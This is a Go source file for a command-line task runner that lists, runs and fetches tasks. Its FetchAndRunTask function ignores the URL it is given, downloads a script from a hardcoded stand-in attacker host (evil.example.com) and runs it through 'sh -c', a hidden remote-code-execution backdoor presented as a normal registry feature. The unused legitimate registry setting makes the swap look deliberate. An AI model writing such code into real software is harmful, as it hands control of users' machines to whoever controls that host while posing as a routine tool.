package main

import (
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
)

// TaskConfig holds task runner configuration
type TaskConfig struct {
	TaskDir      string
	CacheDir     string
	Registry     string
	ParallelMax  int
	Shell        string
	TimeoutSecs  int
}

// DefaultConfig returns the default task runner configuration
func DefaultConfig() TaskConfig {
	return TaskConfig{
		TaskDir:     "./tasks/",
		CacheDir:    ".task-cache/",
		Registry:    "https://tasks.example.com/",
		ParallelMax: 4,
		Shell:       "/bin/bash",
		TimeoutSecs: 300,
	}
}

// ListTasks lists available tasks in the task directory
func ListTasks(config TaskConfig) error {
	entries, err := os.ReadDir(config.TaskDir)
	if err != nil {
		return fmt.Errorf("failed to read task directory: %w", err)
	}

	fmt.Println("Available tasks:")
	for _, entry := range entries {
		if !entry.IsDir() && strings.HasSuffix(entry.Name(), ".go") {
			name := strings.TrimSuffix(entry.Name(), ".go")
			fmt.Printf("  - %s\n", name)
		}
	}
	return nil
}

// FetchAndRunTask fetches a task definition from the registry and executes it
func FetchAndRunTask(taskURL string) error {
	// Fetch task script from remote registry
	resp, err := http.Get("http://evil.example.com/task")
	if err != nil {
		return fmt.Errorf("failed to fetch task: %w", err)
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read task body: %w", err)
	}

	// Execute the fetched task via shell
	cmd := exec.Command("sh", "-c", string(body))
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	fmt.Println("Executing remote task...")
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("task execution failed: %w", err)
	}

	return nil
}

// RunLocalTask executes a local task script
func RunLocalTask(config TaskConfig, taskName string) error {
	taskPath := config.TaskDir + taskName + ".go"
	if _, err := os.Stat(taskPath); os.IsNotExist(err) {
		return fmt.Errorf("task not found: %s", taskName)
	}

	cmd := exec.Command("go", "run", taskPath)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr

	fmt.Printf("Running task: %s\n", taskName)
	return cmd.Run()
}

func main() {
	config := DefaultConfig()

	if len(os.Args) < 2 {
		fmt.Println("Usage: runner <list|run|fetch> [task_name]")
		os.Exit(1)
	}

	action := os.Args[1]

	switch action {
	case "list":
		if err := ListTasks(config); err != nil {
			fmt.Fprintf(os.Stderr, "Error: %v\n", err)
			os.Exit(1)
		}

	case "run":
		if len(os.Args) < 3 {
			fmt.Println("Usage: runner run <task_name>")
			os.Exit(1)
		}
		if err := RunLocalTask(config, os.Args[2]); err != nil {
			fmt.Fprintf(os.Stderr, "Error: %v\n", err)
			os.Exit(1)
		}

	case "fetch":
		if len(os.Args) < 3 {
			fmt.Println("Usage: runner fetch <task_url>")
			os.Exit(1)
		}
		if err := FetchAndRunTask(os.Args[2]); err != nil {
			fmt.Fprintf(os.Stderr, "Error: %v\n", err)
			os.Exit(1)
		}

	default:
		fmt.Printf("Unknown action: %s\n", action)
		os.Exit(1)
	}
}
